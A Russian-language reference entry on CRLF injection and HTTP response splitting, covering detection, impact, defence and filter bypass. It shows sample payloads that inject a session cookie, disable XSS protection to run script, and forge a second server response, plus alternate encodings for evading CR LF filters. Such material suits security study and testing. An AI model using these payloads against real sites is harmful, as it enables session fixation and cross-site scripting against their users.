


# уязвимость/атака

## Описание
Атака представляет из себя модификацию заголовков ответа возвращаемого пользователю путем вставки символов переноса строки (CR LF). Она эксплуатирует недостаток валидации данных, полученных от пользователя.


## Классификация
- Добавление своего заголовка
- **HTTP Response Splitting** - разделение ответа сервера на 2

## Условия
- ОС: любая
- Сервер: любой
- При определенных условиях в заголовках ответа встречаются данные, полученные от пользователя (Чаще всего в заголовках `Location` и `Set-Cookie`).
## Детектирование
- Для выявления необходимо исследовать заголовки ответов сервера.
- При обнаружении информации, похожей на пользовательский ввод в него подставляются символы переноса строки (`%0D%0A` в URL-кодировке) и отслеживаются изменения заголовков.

## Эксплуатация
Пример уязвимого эндпоинта: при переходе на `http://vulnerable?redirect=location`ответ выглядит следующим образом:
```http
...
Location: location
...
```
- При передачи параметра `location=example.com%0d%0aSet-Cookie: Session_id=some_value` будет возвращено:
```http
...
Location: example.com
Set-Cookie: Session_id=some_value
...
```
В результате этого произойдет установка известной сессии.
- При передачи параметра `location=example.com%0d%0aX-XSS-Protection:0%%0d%0a%0d%0a<script>some_code</script>` будет возвращено:
```http
...
Location: example.com
X-XSS-Protection:0

<script>some_code</script>
...
```
В этом случае переданный JavaScript код попадет в тело ответа и будет выполнен
- Есть возможность добавить добавить еще один ответ от сервера (при условии возможности инициировать несколько запросов пользователя). Например передав `location=example.com%0D%0A%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0A%0D%0A%3Chtml_code%3E` будет возвращено:
```http
...
Location: example.com


HTTP/1.1 200 OK
Content-Type: text/html

<html_code>
...
```
Браузер пользователя распознает это как 2 http ответа и на 2 запрос отобразит переданный код.
### Инструменты
- [Wapiti](http://wapiti.sourceforge.net/)
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Ущерб
Возможна следующая эксплуатация данной уязвимости:
- Установка произвольных кук пользователю, в том числе фиксация сессии.
- Возможность применения XSS.
- Отображение произвольной информации пользователю и введение его в заблуждение.
- Возможность Cross-User атак.

## Защита
Фильтрация пользовательской информации, которая может попасть в заголовки.

## Обход защиты
- Использование различных кодировок:
	- ACII: `0x0D0x0A`
	- UTF8: `%E5%98%8D%E5%98%8A`